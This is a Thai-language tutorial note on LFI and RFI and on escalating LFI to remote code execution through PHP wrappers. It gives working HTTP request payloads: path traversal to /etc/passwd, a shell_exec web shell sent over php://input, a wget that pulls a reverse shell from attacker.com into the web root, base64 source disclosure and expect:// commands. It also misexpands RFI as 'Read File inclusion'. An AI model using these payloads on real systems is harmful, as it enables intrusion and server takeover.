
### <span style="color:rgb(255, 162, 31)">LFI x RFI</span>
LFI ย่อมากจาก Local File inclusion
RFI ย่อมาจาก Read File inclusion
RCE ย่อมาจาก Remote Code Execution
Remote Code Execution (RCE) คือการที่ผู้โจมตีสามารถสั่งให้คอมพิวเตอร์ของเป้าหมายรันคำสั่งที่เป็นอันตรายจากระยะไกลได้ 😈 ทำให้ผู้โจมตีสามารถควบคุมระบบ, ขโมยข้อมูล, หรือติดตั้งมัลแวร์ได้

---
ตารางเปรียบเทียบ LFI x RFI

| คุณสมบัติ            | **Local File Inclusion (LFI)**                            | **Remote File Inclusion (RFI)**                                      |
| -------------------- | --------------------------------------------------------- | -------------------------------------------------------------------- |
| **ที่มาของไฟล์**     | ไฟล์ที่อยู่บนเซิร์ฟเวอร์เป้าหมาย                          | ไฟล์จากเซิร์ฟเวอร์ภายนอกที่ผู้โจมตีควบคุมอยู่                        |
| **ความอันตราย**      | อันตรายน้อยกว่า RFI แต่สามารถยกระดับเป็น RCE ได้          | อันตรายสูงกว่าและนำไปสู่ RCE ได้โดยตรง                               |
| **เทคนิคที่ใช้**     | Path Traversal (`../`)                                    | URL ที่ชี้ไปยังไฟล์ภายนอก                                            |
| **ตัวอย่างการโจมตี** | `http://example.com/page.php?file=../../../../etc/passwd` | `http://example.com/page.php?file=http://attacker.com/malicious.txt` |
### LFI To RCE

==ความหมายและที่มา==
LFI ย่อมากจาก Local File inclusion
RCE ย่อมาจาก Remote Code Execution
Remote Code Execution (RCE) คือการที่ผู้โจมตีสามารถสั่งให้คอมพิวเตอร์ของเป้าหมายรันคำสั่งที่เป็นอันตรายจากระยะไกลได้ 😈 ทำให้ผู้โจมตีสามารถควบคุมระบบ, ขโมยข้อมูล, หรือติดตั้งมัลแวร์ได้

---

LFI To RCE ด้วยการ PHP wrapper
PHP wrappers คือ โปรโตคอลในตัว (built-in protocols) ที่ใช้เพื่อเข้าถึงระบบไฟล์, เว็บไซต์, หรือข้อมูลอื่นๆ
ประเภทของ PHP wrapper
- `php://` เป็น wrapper ที่อันตรายมากถ้ามีช่องโหว่
	- `php://input` ใช้อ่านข้อมูลจากส่วนของ request body (POST data)
	- `php://filter` ใช้แปลงไฟล์ข้อมูลของไฟล์  เช่น การเข้ารหัส base64
	- `php://stdin` ใช้เพื่ออ่านข้อมูลจาก standard input
- `file://` เข้าถึงไฟล์ภายในเครื่อง (ทำแบบปกติเลย ls -la บลาๆ)
- `http:// หรือ https://` ใช้เข้าถึง url และดึงข้อมูลจาก website
- `ftp://` เข้าถึง FTP  server
- `data://` ใช้แทรกข้อมูลเข้าไปโดยตรงใน code โดยข้อมูลจะแปลงอยู่ในรูปแบบของ url
- `phar://` ใช้เพื่อเข้าถึงไฟล์ที่เก็บอยู่ในไฟล์ `phar` (PHP Archive)
- `expect://` เป็น php wraper ที่ใช้ในการรันคำสั่งบน shell ได้โดยตรง `expect://<COMMAND>`

---
Example PHP wrapper 
`php://input`
```plaintext
GET /index.php?page=php://input&cmd=pwd HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: __cfduid=dd8465cb7b2c28a4cb6dee2d7096b65fd1546792095
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 41

<?php echo shell_exec($_GET['cmd']); ?>
```

 ```
 php://input&cmd=pwd
 <?php echo shell_exec($_GET['cmd']); ?>
```
คือโค้ดที่แทรกเข้าไป

```plaintext
GET /index.php?page=php://input HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: __cfduid=dd8465cb7b2c28a4cb6dee2d7096b65fd1546792095
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 87

<?php system('wget http://attacker.com/php-reverse-shell.php -O /var/www/shell.php');
```

 ```
 php://input
 <?php system('wget http://attacker.com/php-reverse-shell.php -O /var/www/shell.php');
```

`php://filter`
```plaintext
GET /index.php?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
```

`php://filter/convert.base64-encode/resource=index.php`
การทำงานของมันคือ
เข้าโครงงาน web  index.php > เข้ารหัส base64 > แล้วแสดงให้เราเห็น
เราก็นำข้อความนั่น > decode base64 > ดูทำความเข้าใจดูโครงงาน php
จากปกติถ้าเรา view source เราจะไม่เห็น php code แต่อันนี้คือเราเห็น php ไง
<mark style="background: #FFB86CA6;">วิธีการนี้จะทำให้เราเห็นโค้ด php ซึ่งนำไปสู่จากวิเคราะห์ช่องโหว่ได้อีก</mark>

`expect://`
`expect://<COMMAND>`
```plaintext
GET /index.php?page=expect://whoami HTTP/1.1
Host: target.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9,th-TH;q=0.8,th;q=0.7,en-US;q=0.6,zh-TW;q=0.5,zh-CN;q=0.4,zh;q=0.3,ja;q=0.2
Connection: close
```